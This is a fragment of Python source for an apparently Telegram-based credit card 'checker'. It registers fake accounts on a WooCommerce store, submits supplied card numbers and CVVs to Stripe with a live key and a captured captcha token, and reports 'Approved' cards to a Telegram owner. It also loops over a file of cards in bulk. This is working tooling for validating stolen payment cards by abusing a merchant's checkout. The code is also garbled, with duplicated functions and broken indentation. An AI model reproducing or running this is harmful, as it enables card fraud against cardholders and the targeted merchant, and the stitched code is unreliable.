		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		
		n = cc.split("|")[0]
		mm = cc.split("|")[1]
		yy = cc.split("|")[2]
		cvc = cc.split("|")[3]
		
		import requests,re,base64
		r = requests.session()
		
	import requests,random,string
def chk(cc):
	import requests
	rs=requests.session()
	def gen_email():
		    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
		
		    name_length = 8
		    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
		    domain = random.choice(domains)
		    email = f"{name}@{domain}"
		    return email
	headers = {
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	response = rs.get('https://www.workerkit.com/my-account/',headers=headers)
	nonce=(response.text.split('"_wpnonce" value="')[1].split('"')[0])
	params = {
	    'action': 'register'}
	data = {
	    'email': gen_email(),
	    'email_2': '',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '',
	    'wc_order_attribution_utm_creative_format': '',
	    'wc_order_attribution_utm_marketing_tactic': '',
	    'wc_order_attribution_session_entry': 'https://www.workerkit.com/my-account/payment-methods/',
	    'wc_order_attribution_session_start_time': '2024-10-16 04:07:01',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    '_wpnonce': nonce,
	    '_wp_http_referer': '/my-account/payment-methods/',
	    'register': 'Register',
	}
	
	response = rs.post('https://www.workerkit.com/my-account/add-payment-method', params=params, headers=headers, data=data)
	nonce=(response.text.split('add_card_nonce":"')[1].split('"')[0])
	n,mm,yy,cvc=cc.split('|')
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=hshsbw%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75&sid=63882531-a3ba-45bf-8e52-1d625f36e89b98cb7d&payment_user_agent=stripe.js%2F33292c709a%3B+stripe-js-v3%2F33292c709a%3B+split-card-element&referrer=https%3A%2F%2Fwww.workerkit.com&time_on_page=24064&key=pk_live_51GholBG8PCD7UYBPuFidLoam9lWf3GizFLYytInafpBv36CFnpJ61SsJ7MBmuqcpqky9d9Tmk1ovboifO2lIxpI5005cLYIFLy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZEl5b1Jnc3o4d2ZPdGJId0tJc2RyUkZhWDVoMi81Rlp2Wm9rUmhiMjhjTEtjK3IxOW03YnA0K3ZCa1VaTjNOZGduTmVSbVFnMytPdUxTa2tmTUZidGU4bWI4b3JsTDdxcWpDSXN5OXBVK2Y4QnFlbk83YUFITE1XZ0Q4SFp5ay9Kc1pFVG9sbmVJYXpiN09CWVh0TTVQOFpGNktQVnFnTUNmZ0ZyZ3RlYTg5TlBiVkhEU0NrUkNZNDd5Q1YyakEyZ3BJZW8xYk9wcFJvSWlVMk5qbndzS0RjTTMxNDA3dFlLNHFJKy94R2t1NDdIZG9rZmZ2cGI0SzFYV2JId3cxS0JxdXp0Qm9MSlVjNUMyUWlqTmoxYkp2aFQ0d0tlUXFjY011bnBseXUrWGFWYTdFcHdRY3N2eWFPLzBjWFQxY0V2NURUR0V1aDZuT1dhYkkyUUJObGZIQTZXUFFvVDlNcE93NHJtWlY2dCt5cTl3dmRzTHUrcjdrNnlRNXB6cXB1TklWSTlVMzNtMUU5WGMwUURYanM1eFByN0RKdGZxYTdkbDQvdmZOZGlvNlpKUHZPSXgyZGVkZ3RVT2hUS1FxTHRGRHYrVWtEV3RyOGt2ZlBLZ2tVUXVza0poTGlaYU1oQ3E5TkVDNE1CRTQ0ZEkvR2hqNEQraFBpSVZPbGlQdmJ5RzY5R3lxRmN3U29YSlQ2MmpuTlVJUlNlMzlZVEtIT3c0KzBKcGh1V0hRV0RoWWZKeGMrSXR6eHpZblVrUHlCRklCN2N0SG1nWTlwTGxHWkVVdC80cGF0NFBxaWlnZ0xzYU5vaHpxYjVBRFArRnlOUXpZazFDRHl0Zjk2QlNqYlhOLzBJSnpTTGJPSTY4U2s2alZTSHB3SENEMWl6VGJiUXZDUzFZM05sUkYrMm4yUUNxemtwRTg3OWxyR2czMjZKd0NXRUgrWFQ3RjRXcWNLczRncTRGTS9Nck9jYjJmeTYySTFjc1ZlWmtMTW1YMGtCZFRTR09XMFNodW5mY0IvWEhBZ0wrQTVuaXZWT0FJdWliTytCUGtVTDZYTXA5U2dCcjRiUDN6cC9NdjZQSzNka0pIYUVaUEhzdGVKNU14TDhvZ3NCbXNKSmQ0ekRWWTFBU2c2R1RXSzNtMFNSdmFxTTcxeHVYQXFZZTF5dUQycDA2akpmS1VPME9JaHkzdnFUekM0OC9mTTRDSDdRM1pjKzM4bk5IKzFtKzdwRmx6Skk3KzU5V0Z3RVNMU2xuVHZjRXc3TTkzVkFJcGYrTTVEWlZlU0FjNnoyaWtaeEJZSzE0SWYyR2oya1FhRUJiYUJzRGVhWmVUTVd2eXFYTTNtR3JkQ1BwekZ1bTkxOXEwbG93YUQwVzBteDk2RzBuVGlEN0pWdm5lUksyQis0NXdWL0J5dlQ3Z1pNbWo3UXZiQmRXbWhyTXczVVFIQjA5UzlGcW4zQXZqSnZJYkVNbWNHWTd3NS9WNUpSaE1UaUlPbjVHUTkzdUx2OHFUY2ZFdzhlcU1yL2MvU1UvcFdHeFhrTTFPODY4d09mYU84Y1NzOUNZZXd3eWN1MzhXVVZ2ZXBjTjl1Z0xHblpteGhzRGJFUmt0OGpNZlcrekF1SnlXUVZYenBDclkrL3B0RHRBSGNxT2dXZXNVOVVlaWVLV1duaUNSZWZzRXlJMXczYTkwajRVMUxGVlNjQmdVNDNNdk10OSthd0diMDlYcmVmbU1FS1MwSllMczlLWlUzS3lZSml6cnZxUlhaVG1oYjVYSlFKbU9RNGhOM0x2aHZ1RnNiYXo0MkcveU1YcXF3Z0sybEJRRXhqK2wxYlEwbFpCSmUyTEI0aUtBU3VjSUpZVkRyM0c3MVBjaHJJdFdzRDBuZExEWElqYzBzbXMxZkFiRGJ0NG1yMnJjNkt6NTdpeVNOUnFWbWJqcG8vRVFOMFZqV1NKK0lkMmhWYXpuUUhjSW90OEk4RERXelRVTG1OOFU5MUxLdklUMzQ1UGJ0N3RaVFA3bHhHUG5IeS95d3lCTHNMV25qTnU5azdBWnVtdE1hdWowdDJyVEpJazYxZTJpT09ZUG9Mek84M040Q1JiN21FOUJzREFQYWI0VUVpejJTTG01cTZBTlpnQVhEd0RtYVhKU0d0K0YrVWFIVk54eG80NXNoeHRJRlNkWEQyMTRtaTloRDdTUW9yM2VIVzZydjIvRUFYeTQ4MWNPa01kUEJLenJNZEgyNGo4T1NnL3RWUWNHeElSOEtpbjNsZEQxNmZoQmFtZEFLc0VmWlZFNlRpQzIySXhqR3RDbDhjMTZMZFdvOFRlVTZ5WGo2eXZlT3Z1SUZTelQ4Rmt0UW1lcXhyNG5FaVZTbUlSeE9FL2xwd0UzbktEcndvTE9iSVFwN3A0Wi93ZkFXSjBodk5MWGRGNmpxc013VjZTa0JvdWVJcXFOZzQwb3oxc2pDVHgwY0NzT1dZS2JxaHRJcVY1YTFxUDk0NFYzNU9lWkVZVEZqeGJmYWJ2cGZQbTlRZFNESWtrR2trN2NEa2dEN1p3NVV5azZRSzJvVmNEUFVvM2F6YXdMT092bFRRWUtPbnBHM0dpVGNNMVpUYThTeW1MUUQxME9kZHlramk3TC90Q3F0bm1ITG1oVlg1SlhNUUZTbXgzMWxDU1FvN2hxUU9EUXhzRXYzSUZOV0Z3NTF4M0ZRdElmZXR0VE83dHJrS2tLV2gvell4THVFNkEwV0c2YVlHcE1Jb1hUeG4zWEZ3d1BNTnE4N2FOazNWd2F6aWVlNk5WaWlNN1h0U244a1lWRHo4WXlXM2pKUExyZjJzTlAreXhLNU5HalJ5UEVGWElETFRBPT0iLCJleHAiOjE3MjkwNTA4NDAsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMzZlMDlhZCIsInBkIjowLCJjZGF0YSI6Im9ndVU5KytTd25CQWhlODhpTHN1TkVWSHpSeGNrMW1PcWJwTzJPQnhDZmk1aHlhRk5XUDNZYW9UbmdxRHc3VXFBaUJ1N3BiREtRbVRYV05KNFhiYXhLdUJDbE1jcCtqTzBKM1hOK0hvU0NvNWcrVnNjUEpEbFcwTklWMGw5dmpxWWJ3QktMRlVobE1ldFBxU0tJWTJFVnhrandFTDBhNTZmcUZUemFoYk5pb2I1SzhaYlQ0ZDA0ZHpZMVkwd1ZQcm96aEFWcFFEWW4zZksyS0MifQ.N0j0dZFyIDx79PwbqmZEyn1CludlaF_MVLx2VyUjp1A'
	
	response = rs.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	import requests
	
	headers = {
	    'authority': 'www.workerkit.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	     'origin': 'https://www.workerkit.com',
	    'pragma': 'no-cache',
	    'referer': 'https://www.workerkit.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = rs.post('https://www.workerkit.com/', params=params, cookies=rs.cookies, headers=headers, data=data)
import requests,random,string
def chk(cc):
	import requests
	rs=requests.session()
	def gen_email():
		    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
		
		    name_length = 8
		    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
		    domain = random.choice(domains)
		    email = f"{name}@{domain}"
		    return email
	headers = {
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	response = rs.get('https://www.workerkit.com/my-account/',headers=headers)
	nonce=(response.text.split('"_wpnonce" value="')[1].split('"')[0])
	params = {
	    'action': 'register'}
	data = {
	    'email': gen_email(),
	    'email_2': '',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '',
	    'wc_order_attribution_utm_creative_format': '',
	    'wc_order_attribution_utm_marketing_tactic': '',
	    'wc_order_attribution_session_entry': 'https://www.workerkit.com/my-account/payment-methods/',
	    'wc_order_attribution_session_start_time': '2024-10-16 04:07:01',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    '_wpnonce': nonce,
	    '_wp_http_referer': '/my-account/payment-methods/',
	    'register': 'Register',
	}
	
	response = rs.post('https://www.workerkit.com/my-account/add-payment-method', params=params, headers=headers, data=data)
	nonce=(response.text.split('add_card_nonce":"')[1].split('"')[0])
	n,mm,yy,cvc=cc.split('|')
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=hshsbw%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75&sid=63882531-a3ba-45bf-8e52-1d625f36e89b98cb7d&payment_user_agent=stripe.js%2F33292c709a%3B+stripe-js-v3%2F33292c709a%3B+split-card-element&referrer=https%3A%2F%2Fwww.workerkit.com&time_on_page=24064&key=pk_live_51GholBG8PCD7UYBPuFidLoam9lWf3GizFLYytInafpBv36CFnpJ61SsJ7MBmuqcpqky9d9Tmk1ovboifO2lIxpI5005cLYIFLy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZEl5b1Jnc3o4d2ZPdGJId0tJc2RyUkZhWDVoMi81Rlp2Wm9rUmhiMjhjTEtjK3IxOW03YnA0K3ZCa1VaTjNOZGduTmVSbVFnMytPdUxTa2tmTUZidGU4bWI4b3JsTDdxcWpDSXN5OXBVK2Y4QnFlbk83YUFITE1XZ0Q4SFp5ay9Kc1pFVG9sbmVJYXpiN09CWVh0TTVQOFpGNktQVnFnTUNmZ0ZyZ3RlYTg5TlBiVkhEU0NrUkNZNDd5Q1YyakEyZ3BJZW8xYk9wcFJvSWlVMk5qbndzS0RjTTMxNDA3dFlLNHFJKy94R2t1NDdIZG9rZmZ2cGI0SzFYV2JId3cxS0JxdXp0Qm9MSlVjNUMyUWlqTmoxYkp2aFQ0d0tlUXFjY011bnBseXUrWGFWYTdFcHdRY3N2eWFPLzBjWFQxY0V2NURUR0V1aDZuT1dhYkkyUUJObGZIQTZXUFFvVDlNcE93NHJtWlY2dCt5cTl3dmRzTHUrcjdrNnlRNXB6cXB1TklWSTlVMzNtMUU5WGMwUURYanM1eFByN0RKdGZxYTdkbDQvdmZOZGlvNlpKUHZPSXgyZGVkZ3RVT2hUS1FxTHRGRHYrVWtEV3RyOGt2ZlBLZ2tVUXVza0poTGlaYU1oQ3E5TkVDNE1CRTQ0ZEkvR2hqNEQraFBpSVZPbGlQdmJ5RzY5R3lxRmN3U29YSlQ2MmpuTlVJUlNlMzlZVEtIT3c0KzBKcGh1V0hRV0RoWWZKeGMrSXR6eHpZblVrUHlCRklCN2N0SG1nWTlwTGxHWkVVdC80cGF0NFBxaWlnZ0xzYU5vaHpxYjVBRFArRnlOUXpZazFDRHl0Zjk2QlNqYlhOLzBJSnpTTGJPSTY4U2s2alZTSHB3SENEMWl6VGJiUXZDUzFZM05sUkYrMm4yUUNxemtwRTg3OWxyR2czMjZKd0NXRUgrWFQ3RjRXcWNLczRncTRGTS9Nck9jYjJmeTYySTFjc1ZlWmtMTW1YMGtCZFRTR09XMFNodW5mY0IvWEhBZ0wrQTVuaXZWT0FJdWliTytCUGtVTDZYTXA5U2dCcjRiUDN6cC9NdjZQSzNka0pIYUVaUEhzdGVKNU14TDhvZ3NCbXNKSmQ0ekRWWTFBU2c2R1RXSzNtMFNSdmFxTTcxeHVYQXFZZTF5dUQycDA2akpmS1VPME9JaHkzdnFUekM0OC9mTTRDSDdRM1pjKzM4bk5IKzFtKzdwRmx6Skk3KzU5V0Z3RVNMU2xuVHZjRXc3TTkzVkFJcGYrTTVEWlZlU0FjNnoyaWtaeEJZSzE0SWYyR2oya1FhRUJiYUJzRGVhWmVUTVd2eXFYTTNtR3JkQ1BwekZ1bTkxOXEwbG93YUQwVzBteDk2RzBuVGlEN0pWdm5lUksyQis0NXdWL0J5dlQ3Z1pNbWo3UXZiQmRXbWhyTXczVVFIQjA5UzlGcW4zQXZqSnZJYkVNbWNHWTd3NS9WNUpSaE1UaUlPbjVHUTkzdUx2OHFUY2ZFdzhlcU1yL2MvU1UvcFdHeFhrTTFPODY4d09mYU84Y1NzOUNZZXd3eWN1MzhXVVZ2ZXBjTjl1Z0xHblpteGhzRGJFUmt0OGpNZlcrekF1SnlXUVZYenBDclkrL3B0RHRBSGNxT2dXZXNVOVVlaWVLV1duaUNSZWZzRXlJMXczYTkwajRVMUxGVlNjQmdVNDNNdk10OSthd0diMDlYcmVmbU1FS1MwSllMczlLWlUzS3lZSml6cnZxUlhaVG1oYjVYSlFKbU9RNGhOM0x2aHZ1RnNiYXo0MkcveU1YcXF3Z0sybEJRRXhqK2wxYlEwbFpCSmUyTEI0aUtBU3VjSUpZVkRyM0c3MVBjaHJJdFdzRDBuZExEWElqYzBzbXMxZkFiRGJ0NG1yMnJjNkt6NTdpeVNOUnFWbWJqcG8vRVFOMFZqV1NKK0lkMmhWYXpuUUhjSW90OEk4RERXelRVTG1OOFU5MUxLdklUMzQ1UGJ0N3RaVFA3bHhHUG5IeS95d3lCTHNMV25qTnU5azdBWnVtdE1hdWowdDJyVEpJazYxZTJpT09ZUG9Mek84M040Q1JiN21FOUJzREFQYWI0VUVpejJTTG01cTZBTlpnQVhEd0RtYVhKU0d0K0YrVWFIVk54eG80NXNoeHRJRlNkWEQyMTRtaTloRDdTUW9yM2VIVzZydjIvRUFYeTQ4MWNPa01kUEJLenJNZEgyNGo4T1NnL3RWUWNHeElSOEtpbjNsZEQxNmZoQmFtZEFLc0VmWlZFNlRpQzIySXhqR3RDbDhjMTZMZFdvOFRlVTZ5WGo2eXZlT3Z1SUZTelQ4Rmt0UW1lcXhyNG5FaVZTbUlSeE9FL2xwd0UzbktEcndvTE9iSVFwN3A0Wi93ZkFXSjBodk5MWGRGNmpxc013VjZTa0JvdWVJcXFOZzQwb3oxc2pDVHgwY0NzT1dZS2JxaHRJcVY1YTFxUDk0NFYzNU9lWkVZVEZqeGJmYWJ2cGZQbTlRZFNESWtrR2trN2NEa2dEN1p3NVV5azZRSzJvVmNEUFVvM2F6YXdMT092bFRRWUtPbnBHM0dpVGNNMVpUYThTeW1MUUQxME9kZHlramk3TC90Q3F0bm1ITG1oVlg1SlhNUUZTbXgzMWxDU1FvN2hxUU9EUXhzRXYzSUZOV0Z3NTF4M0ZRdElmZXR0VE83dHJrS2tLV2gvell4THVFNkEwV0c2YVlHcE1Jb1hUeG4zWEZ3d1BNTnE4N2FOazNWd2F6aWVlNk5WaWlNN1h0U244a1lWRHo4WXlXM2pKUExyZjJzTlAreXhLNU5HalJ5UEVGWElETFRBPT0iLCJleHAiOjE3MjkwNTA4NDAsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMzZlMDlhZCIsInBkIjowLCJjZGF0YSI6Im9ndVU5KytTd25CQWhlODhpTHN1TkVWSHpSeGNrMW1PcWJwTzJPQnhDZmk1aHlhRk5XUDNZYW9UbmdxRHc3VXFBaUJ1N3BiREtRbVRYV05KNFhiYXhLdUJDbE1jcCtqTzBKM1hOK0hvU0NvNWcrVnNjUEpEbFcwTklWMGw5dmpxWWJ3QktMRlVobE1ldFBxU0tJWTJFVnhrandFTDBhNTZmcUZUemFoYk5pb2I1SzhaYlQ0ZDA0ZHpZMVkwd1ZQcm96aEFWcFFEWW4zZksyS0MifQ.N0j0dZFyIDx79PwbqmZEyn1CludlaF_MVLx2VyUjp1A'
	
	response = rs.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	import requests
	
	headers = {
	    'authority': 'www.workerkit.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	     'origin': 'https://www.workerkit.com',
	    'pragma': 'no-cache',
	    'referer': 'https://www.workerkit.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = rs.post('https://www.workerkit.com/', params=params, cookies=rs.cookies, headers=headers, data=data)

	try:
		return (response.json()['error']['message'])
	except:return('Approved')
# Open the file to save approved results
with open('approved_results.txt', 'w') as approved_file:
    # Read credit cards from file
    ccs = open('ccs.txt', 'r').readlines()

    # Process each credit card
    for cc in ccs:
        cc = cc.strip()
        try:
            result = chk(cc)
        except Exception as e:
            result = f"Error: {str(e)}"

        # Print result with conditional coloring
        if result == 'Approved':
            text = Text(f"{cc} = {result}", style="bold green")
            message = f"""
𝗖𝗮𝗿𝗱: » `{cc.strip()}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » 1000: Approved
𝗦𝘁𝗮𝘁𝘂𝘀: » Card Add Successfully ✅
𝗢𝘄𝗻𝗲𝗿: » @Barry_op
"""
            send_telegram_message(message)
            console.print(text)
            # Save the approved result to the file
            approved_file.write(f"{cc} = {result}\n")
            console.print("Approved card saved successfully.", style="bold cyan")
        else:
            console.print(f"{cc} = {result}", style="bold red")
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print("تم تشغيل البوت")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")
